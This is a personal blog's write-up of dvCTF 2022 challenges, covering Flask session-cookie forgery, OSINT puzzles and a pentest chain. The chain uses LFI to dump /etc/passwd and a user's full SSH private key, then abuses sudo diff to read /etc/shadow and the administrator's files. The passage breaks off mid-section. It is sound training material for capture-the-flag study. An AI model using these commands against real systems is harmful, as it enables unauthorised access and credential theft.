---
title: "CTF - dvCTF 2022"
categories: [ctf]
date: 2022-03-11
comments: true
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - dvCTF 2022
---

# DefCamp CTF 2022

<p align="center">
  <img src="/images/writeups/dvCTF2022/logo.png" width="50%"/>
</p>

Welcome to my blog! I've participated in this CTF by my own for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges! Limited time and couldn't go over some of the guessy ones, but overall it was fun!

---

Challenge index:

### Web
- [CyberStreak v1.0](#-cyberstreak-v10)


### OSINT
- [Monkeey](#monkeey)
- [Elon Musk](#elon-musk)
- [Painting spot](#painting-spot)
- [Welcome to the DaVinciCTF!](#welcome-to-the-davincictf)


### Pentest
- [DaVinci's Playlist : Part 1](#-davincis-playlist--part-1)
- [DaVinci's Playlist : Part 2/2.5](#davincis-playlist--part-225)


### Misc
- [Going postal](#going-postal)
- [The HackerMan](#the-hackerman)


### Warmup
- [FrenchFlag](#frenchflag)
- [EBG13](#ebg13)
- [QmFzZTY0](#qmfzzty0)

<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

# Web

## CyberStreak v1.0
499
Easy

Hello,

I am a student and I would like to improve my web development skills. To practice, I am creating my first web application. This application is a kind of cybercoach. Example: you want to do sports. A sport goal could be to do 100 push-ups per day for 1 month. The application will allow you to create this "challenge" and each day, you will have to do the number of push-ups you have set and note it in the application. If you don't do the push-ups for 3 days, it's a failure and you lose your streak.

This first version of the application gives you the possibility to create an account and to do the challenge of the example.

Can you test the security of my application ?

xXx-michel-xXx

http://challs.dvc.tf:5001

Brute force is strictly forbidden and useless.

In the website we have a cookie:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Web/1_0_cookie.png" width="70%"/>
</p>

```
eyJ1c2VybmFtZSI6Imthc2htaXI1NCJ9.YivC-A.5_iPn7HoiGYSz09owFk_MV3PpPE

//Decode base64

{"username":"kashmir54"}b+Â....±è.f.ÏOhÀY.Wsé<
```

Seems like flask cookie (it might look like a JWT due to the three parts separated by dots, but we can differenciate them since the first part is the payload in flask and on JWT is the header, so let's use a great tool for these tasks [flask-unsign](https://github.com/Paradoxis/Flask-Unsign-Wordlist):

```
flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6Imthc2htaXI1NCJ9.Yiu_ug.2GRGxsYtvcTt59h_xKKCq5WXdcc'
[*] Session decodes to: {'username': 'kashmir54'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----;r
[+] Found secret key after 15744 attemptsMVK6tLULz5FS
's3cr3t'
```

The admin might be **xXx-michel-xXx** as stated in the note of the challenge, so let's use that username and sign the cookie with the obtained key:

```
kali@kali:~/Desktop/CTFs/dvCTF2022/Web$ flask-unsign --sign --cookie "{'username': 'xXx-michel-xXx'}" --secret 's3cr3t'
eyJ1c2VybmFtZSI6InhYeC1taWNoZWwteFh4In0.YivC3A.EJrqGZzwBNYqRuH04_ybjzMw_Xk

```

Use that cookie, reload the page and get the flag:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Web/1_1_flag.png" width="70%"/>
</p>

``` dvCTF{80b8d1A92G6a13a98Dc7b546a7a7Y35} ```


---

# OSINT

## Monkeey
50
Easy
In what city is the statue of this monkey found? Wrap it around with the wrapper: dvCTF{city_in_lowercase}

We got this photo from the challenge:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/img.png" width="70%"/>
</p>

Searching for the most characteristic parts of the photo and some keywords, we find this result:

[Google search](https://www.google.com/search?q=big+balls+bonobo&tbm=isch&ved=2ahUKEwjMl8nW0772AhWi8bsIHc25BaUQ2-cCegQIABAA&oq=big+balls+bonobo&gs_lcp=CgNpbWcQAzoHCCMQ7wMQJ1DBAljBAmDfB2gAcAB4AIABxQGIAZACkgEDMS4xmAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=UJArYsyvJqLj7_UPzfOWqAo&bih=937&biw=1920&hl=en-ES#imgrc=pPeIsoVUGpayhM)

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/king.webp" width="70%"/>
</p>

Digging deep in the related images shows the name "king kong balls prague" and a quick search with that query confirmed us the city:

``` dvCTF{prague} ```


## Elon Musk
120
Easy
Hi,

I'm a huge fan of Elon Musk so I invested all my money in cryptocurrencies. However, I I got lost in the cryptoworld and I lost something, can you help me find it?

Sincerely,

@IL0veElon

So we have the following id, most probably is from Twitter: @IL0veElon

And it is [IL0veElon twitter account](https://twitter.com/IL0veElon)

Scrolling on his tweets I found one that caught my attention [Tweet](https://twitter.com/IL0veElon/status/1453410714446614540):

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/2_0_tweet.png" width="50%"/>
</p>

```
099627400a565a0cc64c3a61ee0ce785d80dfbd30e1b1ea8bcb9fdd9952b9b8a
```

It seems like a transaction id or a public key for a cryptocurrency wallet or something, probably from $DOGE or $SHIB. I used most blockchain browsers such as [Etherscan](https://etherscan.io/) and [blockchain.com](https://www.blockchain.com/explorer?utm_campaign=expnav_explorer) but nothing showed up.

Going over the twitter account I double checked his bio and spotted a shy **$EGLD** among all the $DOGE $SHIB

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/2_1.png" width="60%"/>
</p>

Bio:
```
$DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $EGLD $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE $SHIB $DOGE
```

So I went into a $EGLD network lookup and got [the transaction](https://explorer.elrond.com/transactions/099627400a565a0cc64c3a61ee0ce785d80dfbd30e1b1ea8bcb9fdd9952b9b8a). Down on the input data, we can see the flag:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/2_2_flag.png" width="80%"/>
</p>

``` dvCTF{Bl0cKcH4In_Rul3S} ```


## Painting spot
461
Found a nice painting spot, took a picture of it. But I can't remember where it is... The flag is in the form of dvCTF{} and has the flag wrapper already

We got the photo from the challenge:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/paintingSpot.jpg" width="70%"/>
</p>

I used exiftool for a sanity check and try my luck for it to have GPS information.

```
GPS Altitude Ref                : Above Sea Level
GPS Speed Ref                   : km/h
GPS Speed                       : 0.07419386512
GPS Img Direction Ref           : True North
GPS Img Direction               : 227.9959872
GPS Dest Bearing Ref            : True North
GPS Dest Bearing                : 227.9959872
GPS Horizontal Positioning Error: 6.047869715 m
XP Title                        : Lugar para pintar
XP Comment                      : Óptimo local para pintar, deixei uma revisão positiva
XP Keywords                     : Pintura
```

These _GPS Dest Bearing_ and _GPS Img Direction_ are not very useful for the geolocation we want to achieve, and no further information about the location was found. Eventough, I found the XP comment which is written in portuguese, so maybe we can limit our search for countries where they speak portuguese.


Next step was to search the photo on Google images with aux text _Portugal_ so the search prioritized images related with Portugal. I went for portugal first just to try. And we found a pretty similar image with [that search query](https://www.google.com/search?hl=en-ES&tbs=simg:CAESYQnrtX6syq4mGxpWCxCwjKcIGjoKOAgEEhSOELo2nDDCO-srjznSNM8c5D2CKBoabTsoaCauq7_1KFfV_1E-Z1QKHYNltjwV_1XikUgBTAEDAsQjq7-CBoKCggIARIE06C4OAw&sxsrf=APq-WBtYq1WoNv7OZBD7zL8-V6G6wAjAMQ:1647161255437&q=portugal+&tbm=isch&source=iu&ictx=1&vet=1&fir=sXsjcNXj7CWqzM%252C2t1atU6yjFRDjM%252C_%253BmyJjZrGvyPiAEM%252CvDXld61xz2U6VM%252C_%253Bx_bPbVpgFBJH6M%252CE8j6qJYlNGZKIM%252C_%253B3xR6b44_dntcPM%252CIDYwiCI3-znIsM%252C_%253BkuYSqTg9_xtGaM%252C2t1atU6yjFRDjM%252C_%253BiHRIxW5s7hNBzM%252CAaxYvs6k_3ppzM%252C_%253B5DvGBr5ytnUrOM%252C5tbMSxwIqkad0M%252C_%253Be8tnQ-X7SJ6w7M%252CJgvDO-s_r6qgpM%252C_%253B6VFnViU-Io-ItM%252ChnDOuHIZNtgNCM%252C_%253BS_9-f9b4XEK-OM%252Covync1OW90CgWM%252C_%253Bt6u4bYBIiiUEqM%252CgWGV_jWIE_kz7M%252C_%253BtiIOdRfrhxkppM%252CP-SyaBaQxbtfpM%252C_%253BwikpgpIHOfhBVM%252C_u7uajf5bT9LQM%252C_%253B1tMs9ZDH23ewlM%252CfdNdBMo0UJi7eM%252C_%253BBOPzBIvB5v-b2M%252CDmceCT_BOyAVjM%252C_%253BLtwC62vWSPMOEM%252C7lz4GajUuesGeM%252C_%253B16y2zq6sdiu45M%252C1EVpcVQB9Ngc7M%252C_%253B_CBehGMcaiWqnM%252CHi3g4XfbyuBC9M%252C_%253BC00h_gKe31D2fM%252C9rjnxlRGhWXBXM%252C_%253B_cmALcwWi2w7nM%252CbGvGmjIDjIYVdM%252C_%253BFyOg2lcEgVFgrM%252CIDYwiCI3-znIsM%252C_%253BLe3cgaRDDbtZlM%252CBTFUMqMfnd1uwM%252C_%253B1-kqx2TevvEmAM%252CHnPEyxR6W06UjM%252C_%253B7wDGhP09O77uBM%252COH4XbrMymksHaM%252C_&usg=AI4_-kT630WJn5M7fASrqKn_vi6cqkRPYw&sa=X&ved=2ahUKEwjfjpLs2cL2AhUwzIUKHfuFDhsQ9QF6BAgFEAE&biw=1920&bih=937&dpr=1#imgrc=sXsjcNXj7CWqzM):

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_0.png" width="70%"/>
</p>

I went to the [website with that photo](https://www.butterfield.com/trip/bespoke/portugal-bespoke)and looking into more results of that google query, I could see that was on the Azores Island. We could keep looking for what is that place (easy, some results below the first image shows Islet of Vila Franca do Campo) but I came into adventure mode, open GMaps satelite and searched for that islet in the map going around Azores coast looking:

Until I found it [here](https://www.google.com/maps/place/Azores,+Portugal/@37.7102793,-25.4364957,3117m/data=!3m1!1e3!4m5!3m4!1s0xb467f1e11e43b05:0xe2911b674bce0c1d!8m2!3d37.7412488!4d-25.6755944):

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_1.png" width="70%"/>
</p>

Using the [Stree View](https://www.google.com/maps/@37.7137925,-25.4376807,3a,75y,259.83h,92.26t/data=!3m8!1e1!3m6!1sAF1QipM_UT7AfQRd0e-stD6TKwde-6DjCj7hnvx7Mu4!2e10!3e11!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipM_UT7AfQRd0e-stD6TKwde-6DjCj7hnvx7Mu4%3Dw203-h100-k-no-pi-0-ya156.22214-ro0-fo100!7i8704!8i4352) this seems familiar on Praia do Corpo Santo. We have the rocks, the landscape and the green changing rooms with white walls: 

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_2.png" width="70%"/>
</p>


Looking around, we can asume that the photo was taken from [here](https://www.google.com/maps/@37.7141485,-25.4370504,3a,75y,222.96h,92.12t/data=!3m6!1e1!3m4!1s8_DgGHl5cVCabgsLqBDJcQ!2e0!7i13312!8i6656) since [this](https://www.google.com/maps/place/Praia+do+Corpo+Santo/@37.7139758,-25.4376009,3a,75y,90t/data=!3m8!1e2!3m6!1sAF1QipO3p3ujjT2-5FhWTa4q-hjYOe_KW1eR-pq5iPmX!2e10!3e12!6shttps:%2F%2Flh5.googleusercontent.com%2Fp%2FAF1QipO3p3ujjT2-5FhWTa4q-hjYOe_KW1eR-pq5iPmX%3Dw203-h152-k-no!7i4160!8i3120!4m15!1m7!3m6!1s0xb467f1e11e43b05:0xe2911b674bce0c1d!2sAzores,+Portugal!3b1!8m2!3d37.7412488!4d-25.6755944!3m6!1s0xb5d266793165e47:0x67087c18f2a2ff7e!8m2!3d37.7139758!4d-25.4376009!14m1!1BCgIgAQ) is almost the one we had:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_3.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_4.png" width="70%"/>
</p>

At this point we are looking for a Google review, since the comment on the exiftool said _deixei uma revisão positiva_ "I left a positive review". So maybe on the beach there is a review with the flag:

Sorted [the reviews of the beach](https://www.google.com/maps/place/Praia+do+Corpo+Santo/@37.7139758,-25.438058,185m/data=!3m1!1e3!4m15!1m7!3m6!1s0xb467f1e11e43b05:0xe2911b674bce0c1d!2sAzores,+Portugal!3b1!8m2!3d37.7412488!4d-25.6755944!3m6!1s0xb5d266793165e47:0x67087c18f2a2ff7e!8m2!3d37.7139758!4d-25.4376009!9m1!1b1) by date and got it:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/3_5.png" width="70%"/>
</p>


``` dvCTF{g3o_sp0tt3d} ```

## Welcome to the DaVinciCTF!
440

We get an image with post-its and opened websites:

<p align="center">
  <img src="/images/writeups/dvCTF2022/OSINT/img.jpg" width="70%"/>
</p>

- Post it 1:
Binance
elonmusk78@gmail.com
Password01

Looking for reversing the Google ID, we see that his name is _Semih Başar_ but this was a dead end. Also his password wasn't working on binance.

- Post it 2:
CTFd
admin
ThisIsAverySecurePassword

Nothing we could do with that. I don't expect them to allow us to get as admin to the CTF platform.

- Post it 3:
(Translate from french)
Buy a Bitcoin
Buy a DegenApe
Become rich
Prepare the CTF website

Another dead end, looked for the email or the username on degenape website and nothing.

- Ledger Recovery phrase note:
We can see many words from a recovery phase. It could be from a ledger wallet or for Metamask, who knows.

minor casino able rare pretty stuff token embrace awake good infant crack news mix edge style this is not my private key sorry dude

As it says, might be another dead end since metamask phases are: 12, 15, 18, 21 or 24 words. Additionally, I wasn't confident on the transcription due to the quality of the image, so I made a couple tries and skipped.

- On tabs:
Binance
FTX
dvCTF
GitHub
DigitalOcean
TradingView

Went over [tradingview](https://www.tradingview.com/) since I know they have a community and users, but no luck for elonmusk78. At this point I got stucked and decided to move on.

Here is where I missed the CTFd link. I completly skipped it since I thought that the admins did the photo on the go and were lazy to close that up, but on that specific path of the website you could find the flag.

---

# Pentest

## DaVinci's Playlist : Part 1
497
Easy

Mr Vinci contacted a web developer to create a website with his favourite rap songs. But did he make it secure?

Website : http://challs.dvc.tf:51080

Ports : 51000-52000

So we have a simple website at port 51080 with two parameters to display some youtube videos depending the query:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Pentest/1.png" width="80%"/>
</p>

Testing one of the parameters I came across a LFI on the playlistTop one:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Pentest/1_0_lfi.png" width="80%"/>
</p>

With the following input I got the line 4 of the **/etc/passwd** file, so apparently the back end was opening a file with the path for the youtube link.

At some point of the HTML:
```html
<!-- URL request: http://challs.dvc.tf:51080/?MyTop5=4&playlistTop=/etc/passwd -->

<iframe src="http://www.youtube.com/embed/sys:x:3:3:sys:/dev:/usr/sbin/nologin
" width="560" height="315" frameborder="0" allowfullscreen=""></iframe>
```


We also have SSRF (just in case)

```
challs.dvc.tf:51080/?MyTop5=4&playlistTop=http://webhook.site/2118ba7f-9487-472e-b9c0-bedbd3dbfd52
```
<p align="center">
  <img src="/images/writeups/dvCTF2022/Pentest/1_2_ssrf.png" width="80%"/>
</p>


Ok, let's get the complete set of users. Let's speed things up with a little script:

```python
import requests
import re
import time

lines = [i for i in range(1,50)]
target_file = []
for l in lines:
  r = requests.get('http://challs.dvc.tf:51080/?MyTop5={}&playlistTop=/etc/passwd'.format(l))
  target_line = re.findall(r'embed\/(.*)\n', r.text)
  print(target_line[0])
  target_file.append(target_line[0])

file_content = '\n'.join(target_file)

with open('output_file.txt', 'w') as out_file:
  out_file.write(file_content)

```

Output:

```
kali@kali:~/Desktop/CTFs/dvCTF2022/Pentest$ python3 script.py 
root:x:0:0:root:/root:/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:1000:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
leonardo:x:1001:1001::/home/leonardo:/bin/bash
administrator:x:1002:1002::/home/administrator:/bin/bash
```

Great, so we have users **leonardo** and **administrator**. 

We could retrieve the ssh key for leonardo but the administrator got permission denied:

```html
<!-- URL request: http://challs.dvc.tf:51080/?MyTop5=28&playlistTop=/home/leonardo/.ssh/id_rsa -->

<iframe src="http://www.youtube.com/embed/T2+dRDiuEEwITFfoqh+yPkS/gBvMcFiBCRYGku/Tz5h2BQK3KY1MOYNrtmtjJOEgtbPTcp
```

Use the previous script with the path for the ssh key **/home/leonardo/.ssh/id_rsa** and we got the key:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Let's use it to access the machine. To do that, remember to append an empty line at the end of the key (to match the format) and change the permission to 600 for example (since greater permissions will stop the conection with SSL)

```
chmod 600 leo_rsa
ssh leonardo@138.68.106.171 -p 51022 -i leo_rsa
```

And we are in:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Pentest/1_3_flag.png" width="80%"/>
</p>

``` dvCTF{LF1_4nd_pR1V473_k3y} ```


## DaVinci's Playlist : Part 2/2.5
250
Medium

An unintended way to solve DaVinci's Playlist : Part2
This challenge was reseted due to an unintended solution. This solution worked to retrieve both flags.


Looking to the txt files on the home directory we see:

```
leonardo@playlist:~$ ls
leonardo_flag.txt  list.txt  noteToAdministrator.txt

leonardo@playlist:~$ cat leonardo_flag.txt 
dvCTF{LF1_4nd_pR1V473_k3y}

leonardo@playlist:~$ cat list.txt
US:
The Notorious B.I.G. - Juicy
Snoop Dogg - Who Am I
Kanye West - Diamonds From Sierra Leone
Outkast - Southernplayalisticadillacmuzik 
Drake - War

FR:
Alpha Wann - ÇA VA ENSEMBLE
Freeze Corleone 667 - Freeze Raël
Alpha Wann - apdl
Lomepal - A ce soir
Paris c'est loin - Booba

leonardo@playlist:~$ cat noteToAdministrator.txt 
Set yourself OneRule: For the administrator password, don't use stuff people know I like!!!
```

So maybe the administrator used the name of a song for his password? First I made some quick privesc checks:

```sh

leonardo@playlist:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly

leonardo@playlist:/etc$ ls -la
-r--r----- 1 root root       755 Jan 20  2021 sudoers
drwxr-xr-x 1 root www-data  4096 Mar 11 15:30 sudoers.d
drwxr-xr-x 1 root root      4096 Mar 27  2019 supervisor
-rw-r--r-- 1 root root      1646 Mar 11 21:57 supervisord.conf
-rw-r--r-- 1 root root      2084 Sep  6  2015 sysctl.conf
drwxr-xr-x 1 root root      4096 Mar 27  2019 sysctl.d
drwxr-xr-x 1 root root      4096 Mar 27  2019 systemd
drwxr-xr-x 2 root root      4096 Dec  1  2017 terminfo

# We can see the sudoers.d owned by www-data... Suspicious
leonardo@playlist:/etc$ cd sudoers.d/
leonardo@playlist:/etc/sudoers.d$ ls
mysudoers  README
leonardo@playlist:/etc/sudoers.d$ cat mysudoers 
Defaults listpw=always
leonardo ALL=(root) NOPASSWD: /usr/bin/diff
leonardo@playlist:/etc/sudoers.d$ 

```

So we can use [GTFOBin](https://gtfobins.github.io/gtfobins/diff/) for diff, which will allow us to read any file with elevated privileges:

```sh
LFILE=/etc/shadow
sudo diff --line-format=%L /dev/null $LFILE
```
```
root:*:17501:0:99999:7:::
daemon:*:17501:0:99999:7:::
bin:*:17501:0:99999:7:::
sys:*:17501:0:99999:7:::
sync:*:17501:0:99999:7:::
games:*:17501:0:99999:7:::
man:*:17501:0:99999:7:::
lp:*:17501:0:99999:7:::
mail:*:17501:0:99999:7:::
news:*:17501:0:99999:7:::
uucp:*:17501:0:99999:7:::
proxy:*:17501:0:99999:7:::
www-data:*:17501:0:99999:7:::
backup:*:17501:0:99999:7:::
list:*:17501:0:99999:7:::
irc:*:17501:0:99999:7:::
gnats:*:17501:0:99999:7:::
nobody:*:17501:0:99999:7:::
systemd-timesync:*:17501:0:99999:7:::
systemd-network:*:17501:0:99999:7:::
systemd-resolve:*:17501:0:99999:7:::
systemd-bus-proxy:*:17501:0:99999:7:::
_apt:*:17501:0:99999:7:::
messagebus:*:17644:0:99999:7:::
sshd:*:19057:0:99999:7:::
leonardo:$6$5bUuHJiR$3CnUhwBhpeCK06DWN5OGl2UgC9gypTIgbERFdqfzFiK8PbWPkFGLAogdEWsMtknDE5Bvyt.L./IIl9/TTh47y/:19057:0:99999:7:::
administrator:$6$P41Sptrz$PbbsnwLLcrQnaLF2DpVZDvL9puMfvOHQHtjXPo1MW/mLqZxwsKZpSHNxxxijeYcVm62JzpyFGxmjEWfnoxfgT0:19057:0:99999:7:::
```

So we have the hashes for administrator, now move into cracking those hashes with song names. First, extract the content from the /etc/passwd and /etc/shadow files. The I used john for all this task:

```sh
unshadow passwd shadow > passwords

# Then I created a wordlist with all the song, authors on the list 
# and also other historic references for other things such
# as da vinci paintings, things he liked, disliked, etc

john --wordlist=wordlist.txt passwords

```
I got no luck with that command, but with the following one we got the administrator flag. Going back into my steps, we cna go elevated privileges read, so looking at the leonardo_flag.txt I tried administrator_flag.txt, flag.txt and the last try succed: admin_flag.txt

```sh
leonardo@playlist:~$ LFILE=/home/administrator/admin_flag.txt
leonardo@playlist:~$ sudo diff --line-format=%L /dev/null $LFILE
dvCTF{763cbbc8f0f000830f4125645b587b9b}
```

``` dvCTF{763cbbc8f0f000830f4125645b587b9b} ```

The other solution was to take all the utility from the diff command with elevated privileges. Diff is intended for files, but the goal was to know if in the administrator or root directory had other stuff. Googling I found this [post](https://www.tecmint.com/compare-find-difference-between-two-directories-in-linux/) explaining how to use diff with directories, so with the following command, we could list the filenames within the administrator (on the root one there was nothing useful)

```sh
leonardo@playlist:~$ sudo diff /home/leonardo/ /home/administrator/
Only in /home/administrator/: a988d2ce35940a8a2e966892d342455d
Only in /home/administrator/: admin_flag.txt
Only in /home/leonardo/: leonardo_flag.txt
Only in /home/leonardo/: list.txt
Only in /home/leonardo/: noteToAdministrator.txt
Only in /home/leonardo/: .ssh

# That a988d2ce35940a8a2e966892d342455d file looks good
leonardo@playlist:~$ LFILE=/home/administrator/a988d2ce35940a8a2e966892d342455d
leonardo@playlist:~$ sudo diff --line-format=%L /dev/null $LFILE
dvCTF{f3d8e7963dad81d61515b58a327d9ad0}
```

And we got the flag:

``` dvCTF{f3d8e7963dad81d61515b58a327d9ad0} ```

---

# Misc

## Going postal
500
Medium OSINT Steganography

My dear friend "Bob" made a tool online to uncover the truth behind that map.

This is the map:

<p align="center">
  <img src="/images/writeups/dvCTF2022/Misc/map.jpg" width="80%"/>
</p>

Some exiftools and binwalk over the photo didn't showed anything, so I went for those vertial bars on google. I knew that some similar ones (postnet) are used in the letters and packages, but these ones are not align to a baseline. Then, I went to San Google with [this query](https://www.google.com/search?q=vertical+bars+codes+postnet&tbm=isch&ved=2ahUKEwjiz6_GqsD2AhUVuKQKHfPYASIQ2-cCegQIABAA&oq=vertical+bars+codes+postnet&gs_lcp=CgNpbWcQAzoHCCMQ7wMQJ1CWBVj0EmCEFGgAcAB4AIAB3AGIAbwGkgEFOC4wLjGYAQCgAQGqAQtnd3Mtd2l6LWltZ8ABAQ&sclient=img&ei=oHEsYuL_EJXwkgXzsYeQAg&bih=937&biw=1920&hl=en-ES#imgrc=Wp1SAaHcVar96M) _vertical bars codes postnet_.

in this [website](https://www.neodynamic.com/barcodes/Australia-Post-4-state-Barcode.aspx) I found great information:

<p align="center">
